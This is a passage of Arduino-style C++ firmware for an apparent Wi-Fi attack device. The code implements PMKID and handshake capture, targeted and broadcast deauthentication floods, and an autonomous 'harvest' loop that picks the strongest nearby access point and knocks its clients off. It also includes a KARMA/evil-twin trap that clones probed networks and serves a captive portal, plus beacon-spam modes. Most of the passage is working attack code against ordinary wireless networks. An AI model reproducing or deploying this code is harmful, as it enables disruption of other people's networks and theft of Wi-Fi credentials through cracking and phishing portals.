        String r = String("PMKIDCLIENT:assoc sta=") + macstr;
        Serial.println(r); Serial1.println(r);
        pmkid_clientless(ch, bssid, ssidbuf);
        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_pmkid_cb, 0);
        for(int i=0;i<6;i++){
          delay(1000);
          if(i == 1 || i == 3) pmkid_clientless(ch, bssid, ssidbuf);  // retry assoc
        }
        wifi_set_promisc(0, NULL, 0);
        hsg_target_set = false;   // the client pin belongs to this run only
        String d = "PMKIDCLIENT:eapol=" + String((unsigned)cl_eapol);
        Serial.println(d); Serial1.println(d);
        pmkid_stream(ch);
      }
    }else if(readString.substring(0,5)=="PMKID"){
      // P6 passive: extract PMKID from any M1 seen. Args: PMKID <chan> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      if(apActive) destroyAP();   // monitor capture needs the softAP torn down
      wifi_set_promisc(0, NULL, 0);
      hsg_phase = HSG_IDLE;       // cancel a running grab before taking its callback
      HSCAP_SET(false);
      PMKN_SET(0);
      hsg_target_set = false;   // passive PMKID scan is channel-wide: keep every AP's PMKID
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3, promisc_pmkid_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0, NULL, 0);
      pmkid_stream(ch);
    }else if(readString.substring(0,6)=="PKGRAB"){
      // P6 active: deauth <bssid> to force a client's M1, then extract PMKID.
      // Args: PKGRAB <chan> <bssid-12hex> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String bssid_hex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
      int secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      uint8_t bssid[6]; bool ok = hex_to_mac(bssid_hex, bssid);
      if(!ok){
        Serial.println("ERROR: PKGRAB needs <chan> <bssid-12hex> [secs]");
        Serial1.println("ERROR: PKGRAB needs <chan> <bssid-12hex> [secs]");
      }else{
        bool dry = (readString.indexOf("DRY") >= 0);  // PKGRAB <ch> <bssid> [secs] [DRY]
        hsg_start(bssid, ch, (uint32_t)secs * 1000u, true, dry);
        const char* m = dry ? "PKGRAB: armed (DRY, no deauth TX)" : "PKGRAB: armed";
        Serial.println(m); Serial1.println(m);
      }
    }
      readString="";
    }
    // A partial line that never ends in '\n' would otherwise sit in this buffer forever.
    if(buf.length() > CMD_LINE_MAX) buf = "";
  }

  // D.4/2 (architect): service the lifecycle at the exact command/background boundary -
  // commands have just been serviced, and while the lifecycle owns the radio every legacy
  // background/portal path is excluded (their latency and side effects must not run).
  apTestTick();
  if (atOwned()) {
      // The lifecycle owns the radio, but these two must still run: the evil-twin FSM waits for
      // AT_READY and then tears down, and EVIL's deauth list transmits on the AP's own channel.
      eviltwinTick();
      deauthListTick(true);
      return;
  }

  // P1: channel hop tick
  if (hopping) {
    static uint32_t last_hop = 0;
    static uint8_t hop_idx = 0;
    if (millis() - last_hop >= hop_interval_ms) {
      last_hop = millis();
      hop_idx = (hop_idx + 1) % (hop_count ? hop_count : 1);
      wext_set_channel(WLAN0_NAME, hop_channels[hop_idx]);
      // Log every hop: without this there is no artifact proving which channels were actually swept,
      // and a plan the host set is otherwise unverifiable from outside.
      char hb[24];
      snprintf(hb, sizeof(hb), "HOPCH:%u", (unsigned)hop_channels[hop_idx]);
      Serial.println(hb); Serial1.println(hb);
      led_w(LED_G, !digitalRead(LED_G));
    }
  }

  // B: async passive CAPTURE deadline (loop() finishes it; CAPSTOP aborts early)
  if (CAP_ON() && millis() >= cap_deadline) {
    wifi_set_promisc(0, NULL, 0);
    HSCAP_SET(false);
    CAP_SET(false);
    hs_stream(cap_ch);
  }

  // HSGRAB/PKGRAB: discover STAs -> unicast deauth -> promisc capture.
  if (hsg_phase == HSG_DISCOVER) {
    if (millis() - hsg_t >= hsg_disc_ms) {
      wifi_set_promisc(0, NULL, 0);
      hsg_phase = HSG_DEAUTH;
      hsg_t = millis();
      if (hsg_dry) {   // M2 dry-run: announce the target instead of transmitting
        char db[64];
        snprintf(db, sizeof(db), "HSGDRY: would deauth %02X%02X%02X%02X%02X%02X +%u stas",
                 hsg_bssid[0], hsg_bssid[1], hsg_bssid[2], hsg_bssid[3], hsg_bssid[4], hsg_bssid[5],
                 (unsigned)STA_LOAD());
        Serial.println(db); Serial1.println(db);
      }
    }
  } else if (hsg_phase == HSG_DEAUTH) {
    wext_set_channel(WLAN0_NAME, hsg_ch);
    if (!hsg_dry && !is_dfs_channel(hsg_ch)) {   // DFS: RX-only; hsg_dry: skip all attack TX
      for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
        wifi_tx_deauth_frame(hsg_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
        delay(5);
      }
      // Unicast both directions to each discovered STA — broadcast deauth is often ignored.
      uint8_t sn = STA_LOAD();
      for (uint8_t k = 0; k < sn && k < 8; k++) {
        wifi_tx_deauth_frame(hsg_bssid, (void *)sta_list[k].mac, 6);   // AP -> STA
        delay(5);
        wifi_tx_deauth_frame((void *)sta_list[k].mac, hsg_bssid, 6);   // STA -> AP
        delay(5);
      }
    }
    if (millis() - hsg_t >= hsg_deauth_ms) {
      if (hsg_pmkid) wifi_set_promisc(3, promisc_pmkid_cb, 0);
      else { HSCAP_SET(true); wifi_set_promisc(3, promisc_spike_cb, 0); }
      hsg_phase = HSG_CAPTURE;
      hsg_t = millis();
    } else {
      delay(50);
    }
  } else if (hsg_phase == HSG_CAPTURE) {
    if (millis() - hsg_t >= hsg_cap_ms) {
      wifi_set_promisc(0, NULL, 0);
      HSCAP_SET(false);
      if (hsg_pmkid) pmkid_stream(hsg_ch);
      else hs_stream(hsg_ch);
      hsg_phase = HSG_IDLE;
      // Drop the pin: the next passive path (CAPTURE / PMKID scan) is channel-wide, and a stale
      // BSSID filter would silently discard every other AP's frames.
      hsg_target_set = false;
    }
  }

  // M2: autonomous harvest FSM tick. The grab itself is driven by the hsg tick above; this only
  // advances BETWEEN grabs. One scan per run; cooldown stops re-picking the same AP within the run.
  if (hv_phase == HV_SCAN) {
    int tries = 0;
    while (scanNetworks(5000) && ++tries < 2) delay(500);
    char m[40]; snprintf(m, sizeof(m), "HARVEST:scan n=%u", (unsigned)scan_results.size());
    Serial.println(m); Serial1.println(m);
    hv_phase = HV_SELECT;
  } else if (hv_phase == HV_SELECT) {
    if (hv_targets_left <= 0) {
      hv_phase = HV_IDLE;
      Serial.println("HARVEST:done"); Serial1.println("HARVEST:done");
    } else {
      int best = -1; short bestrssi = -32768;
      for (unsigned i = 0; i < scan_results.size(); i++) {
        if (is_dfs_channel(scan_results[i].channel)) continue;   // DFS: RX-only, cannot deauth
        if (hv_in_cooldown(scan_results[i].bssid)) continue;     // already picked this run
        if (scan_results[i].rssi > bestrssi) { bestrssi = scan_results[i].rssi; best = (int)i; }
      }
      if (best < 0) {
        hv_phase = HV_IDLE;
        Serial.println("HARVEST:done (no eligible AP)"); Serial1.println("HARVEST:done (no eligible AP)");
      } else {
        memcpy(hv_cur_bssid, scan_results[best].bssid, 6);
        int ch = scan_results[best].channel;
        char m[96];
        snprintf(m, sizeof(m),
                 "HARVEST:target %02X%02X%02X%02X%02X%02X ch%d rssi%d left%d %s",
                 hv_cur_bssid[0], hv_cur_bssid[1], hv_cur_bssid[2],
                 hv_cur_bssid[3], hv_cur_bssid[4], hv_cur_bssid[5],
                 ch, bestrssi, hv_targets_left - 1, hv_dry ? "DRY" : "LIVE");
        Serial.println(m); Serial1.println(m);
        hv_mark(hv_cur_bssid);
        hv_targets_left--;
        hsg_start(hv_cur_bssid, ch, hv_cap_ms, false, hv_dry);  // delegate the grab to the hsg FSM
        hv_phase = HV_GRAB;
      }
    }
  } else if (hv_phase == HV_GRAB) {
    if (hsg_phase == HSG_IDLE) hv_phase = HV_SELECT;  // grab finished (HSFRAME/HSDONE already sent)
  }

  eviltwinTick();

  deauthListTick(false);

  // B1/C1: answer a caught probe request (deferred out of the promisc callback).
  if(KON_LOAD() && karma_take()) {
    if(karma_ssid[0]) {
      if(trap_on && trap_armed) {
        // C1: become that network for real, then let the portal do the work.
        trap_armed = false;
        strncpy(trap_ssid, karma_ssid, 32);
        trap_ssid[32] = 0;
        if(apActive) destroyAP();
        // The driver cannot sniff and run a softAP at once: stop promisc first or apbegin fails.
        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
        KON_STORE(false);
        snprintf(ap_channel, sizeof(ap_channel), "%d", karma_chan);
        secured = false;
        // createAP() is asynchronous now: its return value, not apActive, says whether the
        // lifecycle accepted the bring-up.
        if(createAP(trap_ssid, ap_channel)) {
          build_portal_urls(trap_ssid);
          char safe[33]; sanitize_text(trap_ssid, safe, sizeof(safe));
          String t = String("TRAP:") + safe;
          Serial.println(t); Serial1.println(t);
        } else {
          // Could not clone it - go back to plain KARMA so probes still get answered.
          trap_armed = true;
          KON_STORE(true);
          wext_set_channel(WLAN0_NAME, karma_chan);
          wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_karma_cb, 0);
          Serial.println("TRAPFAIL"); Serial1.println("TRAPFAIL");
        }
      }
      if(KON_LOAD() && !apActive) karma_respond(karma_ssid, karma_client, karma_chan);
    }
  }

  if (randomSSID){
    led_w(LED_G, !digitalRead(LED_G));
    int randomIndex = random(0, 10);
    int randomChannel = allChannels[randomIndex];
    String ssid2 = generateRandomString(10);
    random_mac(randMac);

    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME,randomChannel);
    for(int x=0;x<5;x++){
      tx_beacon_raw(randMac, TX_BCAST, ssid_cstr2, 0x80, randomChannel);
    }
  }
  if (rickroll){
    led_w(LED_G, !digitalRead(LED_G));
    for (int v = 0; v < 8; v++){   // FIX: was `for (int v; ...)` — v uninitialized (UB)
      String ssid2 = rick_roll[v];
      random_mac(randMac);

      const char * ssid_cstr2 = ssid2.c_str();
      wext_set_channel(WLAN0_NAME,v+1);
      for(int x=0;x<5;x++){
       tx_beacon_raw(randMac, TX_BCAST, ssid_cstr2, 0x80, v+1);
      }
    }
  }
  if (ghostSpam){
    led_w(LED_G, !digitalRead(LED_G));
    for (int v = 0; v < 8; v++){
      const char * ssid_cstr2 = ghost_ssids[v];
      wext_set_channel(WLAN0_NAME, v+1);
      for(int x=0;x<5;x++){
        tx_beacon_raw((const uint8_t*)"\x00\xE0\x4C\x01\x02\x03", TX_BCAST, ssid_cstr2, 0x80, v+1);
      }
    }
  }
  if(ssid!=""){
    int channel = 5;
    led_w(LED_G, !digitalRead(LED_G));
    wext_set_channel(WLAN0_NAME,channel);
    const char * ssid_cstr2 = ssid.c_str();
    // Print once per SSID, not once per beacon: this runs every loop() pass (~150+/s), which
    // flooded the USB log and made the out-of-band control channel unusable while beaconing.
    static char last_ssid[33] = {0};
    if(strcmp(last_ssid, ssid_cstr2) != 0) {
      strncpy(last_ssid, ssid_cstr2, 32);
      last_ssid[32] = '\0';
      DEBUG_SER_PRINT("START "+ssid);
    }
    for(int x=0; x<5; x++){
      tx_beacon_raw((const uint8_t*)"\x00\xE0\x4C\x01\x02\x03", TX_BCAST, ssid_cstr2, 0x80, channel);
    }

  }
  
}